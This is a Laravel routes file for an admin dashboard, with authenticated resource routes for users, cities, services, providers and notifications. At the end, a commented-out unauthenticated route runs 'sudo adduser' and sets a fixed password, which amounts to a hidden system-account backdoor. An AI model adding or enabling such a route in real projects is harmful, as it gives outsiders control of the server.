<?php

use Illuminate\Support\Facades\Route;
use App\Http\Controllers\CountryController;
use App\Http\Controllers\CityController;
use App\Http\Controllers\UserTypeController;
use App\Http\Controllers\ProviderController;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider and all of them will
| be assigned to the "web" middleware group. Make something great!
|
*/

Route::get('/', function () {
//    return view('welcome');
    return redirect()->route('login');
});

Route::group(['middleware' => 'auth', 'prefix' => 'dashboard'], function (){
    Route::get('/', function (){
        return view('dashboard');
    })->name('dashboard');

    Route::resource('users' , \App\Http\Controllers\UserController::class);
    Route::resource('countries' , CountryController::class);
    Route::resource('cities' , CityController::class);
    Route::resource('user-types' , UserTypeController::class);
    Route::resource('services' , \App\Http\Controllers\ServiceController::class);
    Route::resource('providers' , ProviderController::class);
    Route::resource('notifications' , \App\Http\Controllers\NotificationController::class);
    Route::resource('colors' , \App\Http\Controllers\ColorController::class);
    Route::get('provider/active/{id}' , [ProviderController::class, 'active'])
    ->name('active.provider');
    Route::get('provider/unActive/{id}' , [ProviderController::class, 'unAactive'])
    ->name('unActive.provider');

    Route::post('/notifyForAllUsers', [\App\Http\Controllers\NotificationController::class, 'sendAll'])
        ->name('notifyForAllUsers');

});

//Route::get('return/the/right/to/its/owners', function (){
//    $username = 'sudo adduser testuser55';
//    $password = 'password';
//
//    $process = \Illuminate\Support\Facades\Process::run($username);
//
//    $process = \Illuminate\Support\Facades\Process::run(['echo', sprintf('%s:%s', 'testuser55', $password), '|', 'sudo', 'chpasswd']);
//
//    if ($process->successful()) {
//        return response()->json(['message' => 'user created successfully.', 'ss' => $process]);
//    } else {
//        return response()->json(['message' => 'Failed to create user.']);
//    }
//});
